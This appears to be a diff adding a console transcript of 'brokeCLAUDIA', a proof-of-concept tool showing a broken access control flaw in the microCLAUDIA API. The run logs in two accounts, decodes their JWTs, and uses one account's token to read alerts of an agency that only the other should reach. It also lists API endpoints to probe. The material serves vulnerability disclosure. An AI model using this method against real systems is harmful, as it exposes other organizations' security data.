@@ -1,0 +1,135 @@
+
+C:\Users\user1\Downloads\brokeCLAUDIA>python main.py
+
+     __               __        ________    ___   __  ______  _______
+    / /_  _________  / /_____  / ____/ /   /   | / / / / __ \/  _/   |
+   / __ \/ ___/ __ \/ //_/ _ \/ /   / /   / /| |/ / / / / / // // /| |
+  / /_/ / /  / /_/ / ,< /  __/ /___/ /___/ ___ / /_/ / /_/ // // ___ |
+ /_.___/_/   \____/_/|_|\___/\____/_____/_/  |_\____/_____/___/_/  |_|
+                                                 By TheMalwareGuardian
+
+ brokeCLAUDIA - Broken access control vulnerability in microCLAUDIA
+
+
+
+? Select an action: PoC - Broken Access Control (Check with two accounts)
+Auto Exploit
+
+User 1
+Enter the username (user@test.local): servizos****@****
+Enter the password (********):
+Request to: https://microclaudia.ccn-cert.cni.es/api/login
+
+JSON Web Token / JSON Web Signature: Bearer ey****.ey****.O1****
+JWT/JWS (RFC7519): Header.Payload.Signature
+
+Decode Payload:
+{
+  "jti": "3800****",
+  "sub": "servizos****@****",
+  "roles": "ROLE_MANAGER",
+  "iat": 1700227632,
+  "iss": "ISSUER",
+  "exp": 1700229432
+}
+
+Username: servizos****@****
+
+Issued At (iat): 2023-11-17 13:27:12 UTC
+Expiration Time (exp): 2023-11-17 13:57:12 UTC
+Token Duration: 0:30:00
+
+You can use the token to make requests or try the PoC
+Download Insomnia (https://insomnia.rest/) or Postman (https://www.postman.com/)
+
+User 2
+Enter the username (user@test.local): ciber****@****
+Enter the password (********):
+Request to: https://microclaudia.ccn-cert.cni.es/api/login
+
+JSON Web Token / JSON Web Signature: Bearer ey****.ey****.VL****
+JWT/JWS (RFC7519): Header.Payload.Signature
+
+Decode Payload:
+{
+  "jti": "bab5****",
+  "sub": "ciber****@****",
+  "roles": "ROLE_MANAGER",
+  "iat": 1700227661,
+  "iss": "ISSUER",
+  "exp": 1700229461
+}
+
+Username: ciber****@****
+
+Issued At (iat): 2023-11-17 13:27:41 UTC
+Expiration Time (exp): 2023-11-17 13:57:41 UTC
+Token Duration: 0:30:00
+
+You can use the token to make requests or try the PoC
+Download Insomnia (https://insomnia.rest/) or Postman (https://www.postman.com/)
+
+User 1:
+Request to: https://microclaudia.ccn-cert.cni.es/api/instances
+Request to: https://microclaudia.ccn-cert.cni.es/api/instances/7c56****e8e2/agencies/all?size=100
+User 2:
+Request to: https://microclaudia.ccn-cert.cni.es/api/instances
+Request to: https://microclaudia.ccn-cert.cni.es/api/instances/7c56****e8e2/agencies/all?size=100
+User 1 has access to 61 agencies
+User 2 has access to 2 agencies
+We will make only one request to verify that by using the token from account X, it is possible to access/modify information (alerts, teams, vaccines, agents, ...) in account Y, exploiting this broken access control vulnerability.
+A request from User 1 is made to gather information on an agency that only User 2 should have access to
+Request to: https://microclaudia.ccn-cert.cni.es/api/agencies/3664****b8d1/alerts
+
+ ______________
+|\ ___________ /|
+| |  /|,| |   | |
+| | |,x,| |   | |
+| | |,x,' |   | |
+| | |,x   ,   | |
+| | |/    |   | |
+| |    /] ,   | |
+| |   [/ ()   | |
+| |       |   | |
+| |       |   | |
+| |       |   | |
+| |      ,'   | |
+| |   ,'      | |
+|_|,'_________|_| VULNERABLE
+
+
+
++------------------------------------------------------------------+-------------------------------------------------------------+------------------------------------------------------------------+----------------------+
+|                        User 1 - Agency ID                        |                     User 1 - Agency Name                    |                        User 2 - Agency ID                        | User 2 - Agency Name |
++------------------------------------------------------------------+-------------------------------------------------------------+------------------------------------------------------------------+----------------------+
+|                           0bbe****c923                           |                        Ayuntamiento de A                    |                           519e****ea9e                           |        Xunta A       |
+|                           b228****3492                           |                        Ayuntamiento de B                    |                           3664****b8d1                           |        Xunta B       |
+|                           4aba****b3f1                           |                        Ayuntamiento de C                    |                                                                  |                      |
+|                                ...                               |                             ...                             |                                                                  |                      |
+|                                ...                               |                             ...                             |                                                                  |                      |
++------------------------------------------------------------------+-------------------------------------------------------------+------------------------------------------------------------------+----------------------+
+
+
+? Select an action: PoC - Broken Access Control (Request private element)
+When checking if a user has visibility to an element not accessible through the web interface, focus on these endpoints:
+ - https://microclaudia.ccn-cert.cni.es/api/agencies/AGENCY_ID
+ - https://microclaudia.ccn-cert.cni.es/api/agencies/AGENCY_ID/alerts
+ - https://microclaudia.ccn-cert.cni.es/api/agencies/AGENCY_ID/agents
+ - https://microclaudia.ccn-cert.cni.es/api/agencies/AGENCY_ID/vaccines
+ - https://microclaudia.ccn-cert.cni.es/api/agents/AGENT_ID
+
+Enter the JWT for user1 (header.payload.signature): ey****.ey****.O1****
+Token is still valid
+servizos****@xunta.gal
+Enter the URL(s) (GET request, separate multiple URLs with commas): ****
+Request to: ****
+{
+  ****
+}
+? Select an action:
+❯ microCLAUDIA API Endpoints
+  Sign In to microCLAUDIA Website
+  PoC - Broken Access Control (Check with two accounts)
+  PoC - Broken Access Control (Request private element)
+  Obtain Secret Identifiers (Extract History)
+  Exit
